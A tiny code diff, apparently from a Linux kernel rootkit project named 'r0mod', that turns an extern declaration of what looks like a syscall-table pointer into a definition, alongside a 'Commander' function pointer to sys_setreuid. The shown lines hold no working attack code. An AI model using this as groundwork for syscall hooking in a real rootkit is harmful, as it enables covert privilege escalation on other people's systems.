@@ -5,7 +5,7 @@
 #include <config.h>
 #include <r0mod/global.h>
 
-extern unsigned long *sct;
+unsigned long *sct;
 
 // Commander
 asmlinkage long (*sys_setreuid)(uid_t ruid, uid_t euid);
